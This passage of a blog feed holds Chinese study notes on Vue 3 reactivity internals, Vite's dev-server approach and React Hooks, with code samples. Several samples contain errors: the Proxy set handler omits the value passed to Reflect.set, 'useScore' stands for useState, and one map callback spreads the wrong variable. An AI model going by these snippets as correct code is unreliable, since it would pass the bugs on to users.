&#125;)</span><br><span class="line"></span><br><span class="line">  onUnmounted(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, update)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123; x, y &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">useFeatureA</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> bar = ref(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">return</span> &#123; bar &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; x, y &#125; = useMouse()</span><br><span class="line">    <span class="keyword">const</span> &#123; bar &#125; = useFeatureA()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.bilibili.com/video/BV1Rr4y1L7r3/?spm_id_from=333.337.search-card.all.click&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9" target="_blank" rel="noopener">尤雨溪前端趋势2022的主题演讲</a></li><li><a href="https://www.bilibili.com/video/BV1rC4y187Vw/?spm_id_from=333.337.search-card.all.click&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9" target="_blank" rel="noopener">跟尤雨溪一起解读Vue3源码</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>【笔记】B站跟尤雨溪一起解读Vue3源码</title>
      <link href="/2025/02/05/Vue3-%E6%BA%90%E7%A0%81/"/>
      <url>/2025/02/05/Vue3-%E6%BA%90%E7%A0%81/</url>
      <content type="html"><![CDATA[<h3 id="1-mount-挂载函数"><a href="#1-mount-挂载函数" class="headerlink" title="1. mount 挂载函数"></a>1. mount 挂载函数</h3><p>实现一个<em><code>mount</code></em>挂载函数, 用于把虚拟dom挂载到真实dom上<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mount</span>(<span class="params">vnode, container</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> el = <span class="built_in">document</span>.createElement(vnode.tag)</span><br><span class="line">  <span class="comment">// props</span></span><br><span class="line">  <span class="keyword">if</span> (vnode.props) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> vnode.props) &#123;</span><br><span class="line">      <span class="keyword">const</span> value = vnode.props[key]</span><br><span class="line">      el.setAttribute(key, value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// children</span></span><br><span class="line">  <span class="keyword">if</span> (vnode.children) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> vnode.children === <span class="string">'string'</span>) &#123;</span><br><span class="line">      el.textContent = vnode.children</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      vnode.children.forEach(<span class="function"><span class="params">child</span> =&gt;</span> &#123;</span><br><span class="line">        mount(child, el)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  container.appendChild(el)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params">tag, props, children</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    tag, </span><br><span class="line">    props,</span><br><span class="line">    children</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> vdom = h(<span class="string">'div'</span>, &#123; <span class="attr">class</span>: <span class="string">'red'</span> &#125;, [</span><br><span class="line">  h(<span class="string">'span'</span>, <span class="literal">null</span>, <span class="string">'hello'</span>)</span><br><span class="line">])</span><br><span class="line">mount(vdom, <span class="built_in">document</span>.getElementById(<span class="string">'app'</span>))</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-Reactive-响应式"><a href="#2-Reactive-响应式" class="headerlink" title="2. Reactive 响应式"></a>2. Reactive 响应式</h3><p>响应式，是自动更新的意思，state数据变了，view会自动更新<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;span&gt;&#123;&#123; state.a * <span class="number">10</span> &#125;&#125;&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">onStateChanged(() =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  view = render(state)</span></span><br><span class="line"><span class="regexp">&#125;)</span></span><br></pre></td></tr></table></figure></p><p>怎么实现这个效果呢？不同于<code>setState</code>，Vue一直用依赖收集的方法来实现响应式。</p><p><br></p><h4 id="2-1-依赖收集"><a href="#2-1-依赖收集" class="headerlink" title="2.1 依赖收集"></a>2.1 依赖收集</h4><p>假设每个响应式变量<em><code>value</code></em>，有一个专门处理依赖的class实例，暂定这个class是<em><code>Dep</code></em>。<br>如何把<code>Dep</code>和<code>value</code>链接在一起?</p><ul><li>创建value的同时，new Dep <code>const value = new Dep(123)</code></li><li>当访问<code>value</code>时，触发<code>dep.depend()</code>来收集依赖</li><li>当改变<code>value</code>时，触发<code>dep.notify()</code>来触发更新<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> activeEffect</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dep</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.subscribers = <span class="keyword">new</span> <span class="built_in">Set</span>()</span><br><span class="line">    <span class="keyword">this</span>._value = value</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当访问值时，会隐式调用depend，作依赖搜集</span></span><br><span class="line">  get value() &#123;</span><br><span class="line">    <span class="keyword">this</span>.depend()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._value</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当值更新时，会自动调用notify，来作视图更新</span></span><br><span class="line">  set value(newValue) &#123;</span><br><span class="line">    <span class="keyword">this</span>._value = newValue</span><br><span class="line">    <span class="keyword">this</span>.notify()</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  depend() &#123;</span><br><span class="line">    <span class="keyword">if</span> (activeEffect) &#123;</span><br><span class="line">      <span class="keyword">this</span>.subscribers.add(activeEffect)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  notify() &#123;</span><br><span class="line">    <span class="keyword">this</span>.subscribers.forEach(<span class="function"><span class="params">effect</span> =&gt;</span> &#123;</span><br><span class="line">      effect()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">watchEffect</span>(<span class="params">effect</span>) </span>&#123;</span><br><span class="line">  activeEffect = effect</span><br><span class="line">  effect()</span><br><span class="line">  activeEffect = <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dep = <span class="keyword">new</span> Dep(<span class="string">'hello'</span>)</span><br><span class="line"></span><br><span class="line">watchEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(dep.value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改变值，然后通知更新</span></span><br><span class="line">dep.value = <span class="string">'changed'</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-Object-defineProperty"><a href="#2-2-Object-defineProperty" class="headerlink" title="2.2 Object.defineProperty"></a>2.2 <em><code>Object.defineProperty</code></em></h4><p>Vue2基于<em><code>Object.defineProperty</code></em>来实现响应式。<br>但会引发一些问题。如给data添加属性时，不能直接<code>this.$data.new = value</code>。<br>因为响应式只在一开始设置上，后面直接加的不会有响应的效果。<br>所以可以看到Vue2单独提供了API，需要hack in数组的<code>property</code>重写一些数组的内置方法，如数组的<code>push</code>, <code>pop</code>，让其可以实现响应式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> activeEffect</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dep</span> </span>&#123;</span><br><span class="line">  subscribers = <span class="keyword">new</span> <span class="built_in">Set</span>()</span><br><span class="line">  </span><br><span class="line">  depend() &#123;</span><br><span class="line">    <span class="keyword">if</span> (activeEffect) &#123;</span><br><span class="line">      <span class="keyword">this</span>.subscribers.add(activeEffect)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  notify() &#123;</span><br><span class="line">    <span class="keyword">this</span>.subscribers.forEach(<span class="function"><span class="params">effect</span> =&gt;</span> &#123;</span><br><span class="line">      effect()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">watchEffect</span>(<span class="params">effect</span>) </span>&#123;</span><br><span class="line">  activeEffect = effect</span><br><span class="line">  effect()</span><br><span class="line">  activeEffect = <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reactive</span>(<span class="params">raw</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Object</span>.keys(raw).forEach(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = <span class="keyword">new</span> Dep()</span><br><span class="line">    <span class="keyword">let</span> value = raw[key]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(raw, key, &#123;</span><br><span class="line">      get() &#123;</span><br><span class="line">        dep.depend()</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">      &#125;,</span><br><span class="line">      set(newValue) &#123;</span><br><span class="line">        value = newValue</span><br><span class="line">        dep.notify()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> raw</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> state = reactive(&#123;</span><br><span class="line">  count: <span class="number">0</span></span><br><span class="line">&#125;)</span><br><span class="line">watchEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(state.count)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">state.count = <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-proxy"><a href="#2-3-proxy" class="headerlink" title="2.3 proxy"></a>2.3 proxy</h4><p>Vue3利用<code>Reflect</code>和<code>Proxy</code>来实现响应式，我们需要改造一下上面的<code>reactive</code>方法。<br>基于proxy的实现，我们能检测新属性的添加，并自动添加响应式。<br>在Vue3，如果reactive的变量是个数组，当你设置<code>arr[index] = 1</code>，会触发set，而访问会触发get，依赖会被自动添加。对于数组变化，就不用做额外的处理。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> targetMap = <span class="keyword">new</span> <span class="built_in">WeakMap</span>() <span class="comment">// WeakMap可以用object来作为key</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDep</span>(<span class="params">target, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> depsMap = targetMap.get(target)</span><br><span class="line">  <span class="keyword">if</span> (!depsMap) &#123;</span><br><span class="line">    depsMap = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">    targetMap.set(target, depsMap)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> dep = depsMap.get(key)</span><br><span class="line">  <span class="keyword">if</span> (!dep) &#123;</span><br><span class="line">    dep = <span class="keyword">new</span> Dep()</span><br><span class="line">    depsMap.set(key, dep)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dep</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> reactiveHandlers = &#123;</span><br><span class="line">  get (target, key, receiver) &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = getDep(target, key)</span><br><span class="line">    dep.depend()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, key, receiver) <span class="comment">// 反射，做该对象本该做的事</span></span><br><span class="line">  &#125;,</span><br><span class="line">  set (target, key, value, receiver) &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = getDep(target, key)</span><br><span class="line">    dep.notify()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, key, receiver)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reactive</span>(<span class="params">raw</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(raw, reactiveHandlers)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.bilibili.com/video/BV1rC4y187Vw?spm_id_from=333.788.videopod.episodes&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9&amp;p=5" target="_blank" rel="noopener">跟尤雨溪一起解读Vue3源码</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vite</title>
      <link href="/2025/02/05/vite/"/>
      <url>/2025/02/05/vite/</url>
      <content type="html"><![CDATA[<h3 id="1-打包工具"><a href="#1-打包工具" class="headerlink" title="1. 打包工具"></a>1. 打包工具</h3><ul><li><p>webpack / rollup / browserify<br>初阶段的打包工具，专注于打包，抽象层次低。需要依靠很多第三方插件来配置运行</p></li><li><p>vue-cli / create react app / parcel / CRA<br>脚手架，更高抽象层次的工具，专注于提供一个完整应用解决方案<br>缺点：像一个庞大的黑盒，当你需要自定义的定制时，会比较痛苦</p></li><li><p>vite<br>cli: 专注于应用，抽象层次高<br>api: 专注与支持上层框架，抽象层次中</p></li></ul><p><br></p><h3 id="2-什么是Vite"><a href="#2-什么是Vite" class="headerlink" title="2. 什么是Vite"></a>2. 什么是Vite</h3><p>Vite是新一代的前端构建工具，利用浏览器ESM特性导入组织代码，在服务器端按需编译返回，完全跳过了打包这个概念，服务器随起随用。</p><p><br></p><h4 id="2-1-vite-原理"><a href="#2-1-vite-原理" class="headerlink" title="2.1 vite 原理"></a>2.1 vite 原理</h4><p>利用浏览器现在已经支持ES6的import,碰见import就会发送一个HTTP请求去加载文件。Vite启动一个 koa 服务器拦截这些请求，并在后端进行相应的处理将项目中使用的文件通过简单的分解与整合，然后再以ESM格式返回返回给浏览器。Vite整个过程中没有对文件进行打包编译，做到了真正的按需加载，所以其运行速度比原始的webpack开发编译速度快出许多！</p><p><em>流程大致如下：</em></p><ol><li><p>当声明一个 script标签类型为 module 时,如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"module"</span> src=<span class="string">"/src/main.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>当浏览器解析资源时，会往当前域名发起一个GET请求main.js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.vue'</span></span><br><span class="line">createApp(App).mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure></li><li><p>请求到了main.js文件，会检测到内部含有import引入的包，又会import 引用发起HTTP请求获取模块的内容文件，如App.vue、vue文件</p></li></ol><p><br></p><h4 id="2-2-webpack-原理"><a href="#2-2-webpack-原理" class="headerlink" title="2.2 webpack 原理"></a>2.2 webpack 原理</h4><p>传统的打包工具如Webpack是先解析依赖、打包构建再启动开发服务器，Dev Server 必须等待所有模块构建完成，当我们修改了 bundle模块中的一个子模块， 整个 bundle 文件都会重新打包然后输出。项目应用越大，启动时间越长。</p><p><br></p><h4 id="2-3-热更新"><a href="#2-3-热更新" class="headerlink" title="2.3 热更新"></a>2.3 热更新</h4><p>通过WebSocket创建浏览器和服务器的通信监听文件的改变，当文件被修改时，服务端发送消息通知客户端修改相应的代码，客户端对应不同的文件进行不同的操作的更新。</p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.cn/post/7064853960636989454" target="_blank" rel="noopener">深入理解Vite核心原理</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React Hooks 用法</title>
      <link href="/2025/01/29/React%20Hooks/"/>
      <url>/2025/01/29/React%20Hooks/</url>
      <content type="html"><![CDATA[<blockquote><p>这是一份React Hooks 新官网笔记。<br>不得不感叹 React 的函数组件加上 Hooks（hooks本质上也是一个函数），寥寥几个api就满足了前端页面所有逻辑交互。Vue啊Vue，掉队了啊</p></blockquote><p><br></p><h3 id="1-React-哲学"><a href="#1-React-哲学" class="headerlink" title="1. React 哲学"></a>1. React 哲学</h3><h4 id="1-1-组件是个纯函数"><a href="#1-1-组件是个纯函数" class="headerlink" title="1.1 组件是个纯函数"></a>1.1 组件是个纯函数</h4><p>一个组件必须是纯粹的，React 的函数组件只应该做一件事情：返回组件的 HTML 代码，而没有其他的功能。不应该让外部变量污染组件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 🔴错误示例：受guest影响，多次调用这个组件，会产生不同的JSX，不能这样写</span></span><br><span class="line"><span class="keyword">let</span> guest = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  guest = guest + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;guest&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-Hooks"><a href="#1-2-Hooks" class="headerlink" title="1.2 Hooks"></a>1.2 Hooks</h4><p>React Hooks 的意思是，组件写成纯函数，如果需要外部功能和副作用（组件状态state、具有副作用的操作,如获取数据、事件监听、改变DOM），就用钩子把外部代码”钩”进来。<br>Hooks本身也是一个函数。一个应用由一个个纯函数链接而成。<br>真的好像AI神经网络，应用由一个个节点（神经元）连接起来，每个神经元之间都可以看作是一个函数<code>a = f(b)</code>。纯函数有助于机器理解，所以react就是为AI生成代码作铺垫？</p><p><br></p><h4 id="1-3-UI-Tree"><a href="#1-3-UI-Tree" class="headerlink" title="1.3 UI Tree"></a>1.3 UI Tree</h4><p>树是表示实体之间关系的常见方式，它们经常用于建模 UI。<em>把React组件之间的嵌套关系，看作一棵UI Tree。</em></p><p>顶级组件会影响其下所有组件的渲染性能，而叶子组件通常会频繁重新渲染。识别它们有助于理解和调试渲染性能问题。</p><ul><li>初次渲染时, React 会调用根组件。</li><li>后续的渲染，如果更新后的组件是同一个组件，React 在原组件上更新触发。如果是别的组件，会渲染新的组件。</li></ul><p>对 React 来说重要的是组件在 UI 树中的位置,而不是在 JSX 中的位置</p><p><br></p><h3 id="2-Hooks"><a href="#2-Hooks" class="headerlink" title="2. Hooks"></a>2. Hooks</h3><h4 id="2-1-useState"><a href="#2-1-useState" class="headerlink" title="2.1 useState"></a>2.1 useState</h4><ul><li>state 变量：用于保存渲染间的数据。</li><li><p>state setter 函数：更新变量并触发 React 再次渲染组件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [index, setIndex] = useState(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li><li><p><em>快照的状态</em><br>每次渲染，React都会为你提供这次渲染的一张state快照。<code>setScore</code>会请求一个新的重新渲染，但不会在已运行的代码中更改<code>score</code>的值。所以第二次调用 <code>setScore(score + 1)</code> 时，<code>score</code> 仍然是 0。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [score, setScore] = useScore(<span class="number">0</span>)</span><br><span class="line">setScore(score + <span class="number">1</span>) <span class="comment">// score = 0</span></span><br><span class="line">setScore(score + <span class="number">1</span>) <span class="comment">// 此时 score = 0</span></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  alert(score) <span class="comment">// score 依然是 0</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以用更新函数处理</span></span><br><span class="line">setScore(<span class="function"><span class="params">n</span> =&gt;</span> n + <span class="number">1</span>) <span class="comment">// 此时 n = 1</span></span><br></pre></td></tr></table></figure></li><li><p>更新对象state<br>需要用一个全新的对象来更新</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [person, setPerson] = useState(&#123; <span class="attr">name</span>: <span class="string">'Niki'</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用...创建新对象,注意展开语法是浅层的：它的复制深度只有一层</span></span><br><span class="line">setPerson(&#123; ...person, <span class="attr">name</span>: <span class="string">'other'</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Immer更简洁</span></span><br><span class="line">setPerson(<span class="function"><span class="params">person</span> =&gt;</span> &#123; person.name = <span class="string">'other'</span> &#125;)</span><br></pre></td></tr></table></figure></li><li><p>更新数组state</p><ul><li>不能使用: push、unshift, pop, shift, splice, arr[i] = ,reverse, sort</li><li>可以用: concat, […arr], filter, slice, map</li><li>更新数组内的对象<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wrong: 虽然数组是新的，但是其内部元素本身和元素组是相同的</span></span><br><span class="line"><span class="keyword">const</span> nextList = [...list]</span><br><span class="line">nextList[<span class="number">0</span>].name = <span class="string">'abc'</span></span><br><span class="line">setMyList(nextList)</span><br><span class="line"></span><br><span class="line"><span class="comment">// right: 需要用map来替换</span></span><br><span class="line">setMyList(list.map(<span class="function"><span class="params">v</span> =&gt;</span> v.id === <span class="number">1</span> ? &#123; ...a, <span class="attr">name</span>: <span class="string">'abc'</span> &#125; : v));</span><br></pre></td></tr></table></figure></li></ul></li><li><p><em>等同于computed</em><br>每次新渲染，<code>selectedItem</code>都会从新数据中算出来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [items, setItems] = useState(initialItems);</span><br><span class="line"><span class="keyword">const</span> [selectedId, setSelectedId] = useState(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> selectedItem = items.find(<span class="function"><span class="params">item</span> =&gt;</span></span><br><span class="line">  item.id === selectedId</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>谨慎把props作为state的初始值<br>如果父组件更新了props， color state变量不会被更新</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Message</span>(<span class="params">&#123; messageColor &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [color, setColor] = useState(messageColor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-useReducer"><a href="#2-2-useReducer" class="headerlink" title="2.2 useReducer"></a>2.2 useReducer</h4><p>状态更新逻辑复杂时，把<code>useSstate</code>迁移到<code>useReducer</code>，把它们整合到一个外部函数中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useReducer &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">const</span> initialTasks = 